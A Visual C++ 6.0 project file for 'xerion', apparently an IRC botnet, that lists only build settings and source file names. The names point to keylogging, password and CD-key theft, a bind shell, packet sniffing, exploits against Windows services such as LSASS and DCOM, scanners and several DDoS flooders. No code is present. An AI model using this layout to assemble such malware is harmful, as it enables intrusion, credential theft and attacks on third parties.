# Microsoft Developer Studio Project File - Name="xerion" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Application" 0x0101

CFG=xerion - WIN32 RELEASE
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "xerion.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "xerion.mak" CFG="xerion - WIN32 RELEASE"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "xerion - Win32 Release" (based on "Win32 (x86) Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe
# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "tmp"
# PROP BASE Intermediate_Dir "tmp"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "bin"
# PROP Intermediate_Dir "tmp"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /W3 /GX /O1 /I "C:\Program Files\Microsoft SDK\Include" /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x409 /d "NDEBUG"
# ADD RSC /l 0x409 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /machine:I386
# ADD LINK32 /nologo /subsystem:windows /machine:I386
# SUBTRACT LINK32 /pdb:none
# Begin Target

# Name "xerion - Win32 Release"
# Begin Group "Resource Files"

# PROP Default_Filter "ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe"
# End Group
# Begin Group "- xerion mod -"

# PROP Default_Filter ""
# Begin Group "- xerion core -"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\source\cpp\aliaslog.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\autostart.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\avirus.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\crc32.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\crypt.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\dcc.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\download.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\driveinfo.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\ehandler.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\fphost.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\ident.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\irc_send.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\loaddlls.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\misc.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\processes.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\random.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\rndnick.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\session.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\shellcode.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\sysinfo.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\threads.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\wildcard.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\xerion.cpp
# End Source File
# End Group
# Begin Group "- xerion modules -"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\source\cpp\bindshell.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\capture.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\cdkeys.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\findfile.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\findpass.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\httpd.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\keylogger.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\net.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\netutils.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\psniff.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\redirect.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\remotecmd.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\rlogind.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\secure.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\socks4.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\visit.cpp
# End Source File
# End Group
# Begin Group "- xerion scanners -"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\source\cpp\advscan.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\scan.cpp
# End Source File
# End Group
# Begin Group "- xerion includes -"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\source\h\advscan.h
# End Source File
# Begin Source File

SOURCE=.\source\h\aliaslog.h
# End Source File
# Begin Source File

SOURCE=.\source\h\autostart.h
# End Source File
# Begin Source File

SOURCE=.\source\h\avirus.h
# End Source File
# Begin Source File

SOURCE=.\source\h\capture.h
# End Source File
# Begin Source File

SOURCE=.\source\h\cdkeys.h
# End Source File
# Begin Source File

SOURCE=.\source\h\clsass.h
# End Source File
# Begin Source File

SOURCE=.\source\h\crc32.h
# End Source File
# Begin Source File

SOURCE=.\source\h\crypt.h
# End Source File
# Begin Source File

SOURCE=.\source\h\dcass.h
# End Source File
# Begin Source File

SOURCE=.\source\h\dcc.h
# End Source File
# Begin Source File

SOURCE=.\source\h\dcom.h
# End Source File
# Begin Source File

SOURCE=.\source\h\ddos.h
# End Source File
# Begin Source File

SOURCE=.\source\h\defines.h
# End Source File
# Begin Source File

SOURCE=.\source\h\download.h
# End Source File
# Begin Source File

SOURCE=.\source\h\driveinfo.h
# End Source File
# Begin Source File

SOURCE=.\source\h\ehandler.h
# End Source File
# Begin Source File

SOURCE=.\source\h\externs.h
# End Source File
# Begin Source File

SOURCE=.\source\h\findfile.h
# End Source File
# Begin Source File

SOURCE=.\source\h\findpass.h
# End Source File
# Begin Source File

SOURCE=.\source\h\fphost.h
# End Source File
# Begin Source File

SOURCE=.\source\h\ftpd.h
# End Source File
# Begin Source File

SOURCE=.\source\h\functions.h
# End Source File
# Begin Source File

SOURCE=.\source\h\globals.h
# End Source File
# Begin Source File

SOURCE=.\source\h\httpd.h
# End Source File
# Begin Source File

SOURCE=.\source\h\icmpflood.h
# End Source File
# Begin Source File

SOURCE=.\source\h\ident.h
# End Source File
# Begin Source File

SOURCE=.\source\h\includes.h
# End Source File
# Begin Source File

SOURCE=.\source\h\irc_send.h
# End Source File
# Begin Source File

SOURCE=.\source\h\keylogger.h
# End Source File
# Begin Source File

SOURCE=.\source\h\loaddlls.h
# End Source File
# Begin Source File

SOURCE=.\source\h\lsass.h
# End Source File
# Begin Source File

SOURCE=.\source\h\lsass1lsass.h
# End Source File
# Begin Source File

SOURCE=.\source\h\misc.h
# End Source File
# Begin Source File

SOURCE=.\source\h\mssql.h
# End Source File
# Begin Source File

SOURCE=.\source\h\mssqllsass.h
# End Source File
# Begin Source File

SOURCE=.\source\h\ndcass.h
# End Source File
# Begin Source File

SOURCE=.\source\h\net.h
# End Source File
# Begin Source File

SOURCE=.\source\h\netutils.h
# End Source File
# Begin Source File

SOURCE=.\source\h\nicklist.h
# End Source File
# Begin Source File

SOURCE=.\source\h\passwd.h
# End Source File
# Begin Source File

SOURCE=.\source\h\pingudp.h
# End Source File
# Begin Source File

SOURCE=.\source\h\processes.h
# End Source File
# Begin Source File

SOURCE=.\source\h\psniff.h
# End Source File
# Begin Source File

SOURCE=.\source\h\random.h
# End Source File
# Begin Source File

SOURCE=.\source\h\realcast.h
# End Source File
# Begin Source File

SOURCE=.\source\h\redirect.h
# End Source File
# Begin Source File

SOURCE=.\source\h\remotecmd.h
# End Source File
# Begin Source File

SOURCE=.\source\h\rlogind.h
# End Source File
# Begin Source File

SOURCE=.\source\h\rndnick.h
# End Source File
# Begin Source File

SOURCE=.\source\h\scan.h
# End Source File
# Begin Source File

SOURCE=.\source\h\secure.h
# End Source File
# Begin Source File

SOURCE=.\source\h\session.h
# End Source File
# Begin Source File

SOURCE=.\source\h\shares.h
# End Source File
# Begin Source File

SOURCE=.\source\h\shellcode.h
# End Source File
# Begin Source File

SOURCE=.\source\h\socks4.h
# End Source File
# Begin Source File

SOURCE=.\source\h\synflood.h
# End Source File
# Begin Source File

SOURCE=.\source\h\sysinfo.h
# End Source File
# Begin Source File

SOURCE=.\source\h\tcpflood.h
# End Source File
# Begin Source File

SOURCE=.\source\h\tcpip.h
# End Source File
# Begin Source File

SOURCE=.\source\h\tftpd.h
# End Source File
# Begin Source File

SOURCE=.\source\h\threads.h
# End Source File
# Begin Source File

SOURCE=.\source\h\visit.h
# End Source File
# Begin Source File

SOURCE=.\source\h\wildcard.h
# End Source File
# Begin Source File

SOURCE=.\source\h\wksmass.h
# End Source File
# Begin Source File

SOURCE=.\source\h\xerion.h
# End Source File
# End Group
# Begin Group "- xerion exploits -"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\source\cpp\clsass.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\dcom.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\lsass.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\lsass1lsass.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\mssql.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\mssqllsass.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\ndcass.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\netbios.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\realcast.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\wksmass.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\wkssvc.cpp
# End Source File
# End Group
# Begin Group "- xerion file transfer -"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\source\cpp\ftpd.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\tftpd.cpp
# End Source File
# End Group
# Begin Group "- xerion ddos -"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\source\cpp\dcass.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\ddos.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\icmpflood.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\pingudp.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\synflood.cpp
# End Source File
# Begin Source File

SOURCE=.\source\cpp\tcpflood.cpp
# End Source File
# End Group
# Begin Group "- xerion CONFIGURATION -"

# PROP Default_Filter "*.h"
# Begin Source File

SOURCE=.\source\cfg\conf.h
# End Source File
# End Group
# End Group
# End Target
# End Project
